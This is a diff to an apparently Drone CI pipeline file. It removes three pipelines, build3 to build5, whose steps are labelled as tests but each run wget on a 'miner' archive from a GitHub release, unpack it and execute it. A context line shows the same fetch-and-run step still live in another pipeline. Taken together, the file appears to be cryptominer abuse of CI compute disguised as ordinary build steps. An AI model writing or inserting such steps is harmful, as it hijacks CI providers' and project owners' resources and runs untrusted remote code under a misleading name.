@@ -19,36 +19,6 @@ steps:
   - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
 ---
 kind: pipeline
-type: docker
-name: build3
-
-steps:
-- name: test3
-  image: node
-  commands:
-  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
----
-kind: pipeline
-type: docker
-name: build4
-
-steps:
-- name: test4
-  image: node
-  commands:
-  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
----
-kind: pipeline
-type: docker
-name: build5
-
-steps:
-- name: test5
-  image: node
-  commands:
-  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
----
-kind: pipeline
 name: after
 
 steps:
@@ -61,6 +31,3 @@ steps:
 depends_on:
 - build1
 - build2
-- build3
-- build4
-- build5
